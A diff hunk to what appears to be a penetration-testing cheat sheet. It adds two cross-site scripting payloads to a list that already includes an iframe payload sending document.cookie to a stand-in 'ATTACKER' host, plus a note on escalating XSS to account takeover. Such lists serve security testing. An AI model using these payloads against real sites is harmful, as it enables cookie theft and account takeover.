@@ -2948,6 +2948,8 @@ Manually testing for XXE vulnerabilities generally involves
   - `<iframe src="https://VICTIM.net/#" onload=this.src='http://ATTACKER/?x='+document.cookie;></iframe>`
   - `<iframe src="https://VICTIM.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
 - `<><img src=x onerror=alert()>`
+- `<body onresize=print() onload=this.style.width='100px'>`
+- `<xss id=x onfocus=alert(document.cookie) tabindex=1>`
 
 #### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
 - Change email > Password reset
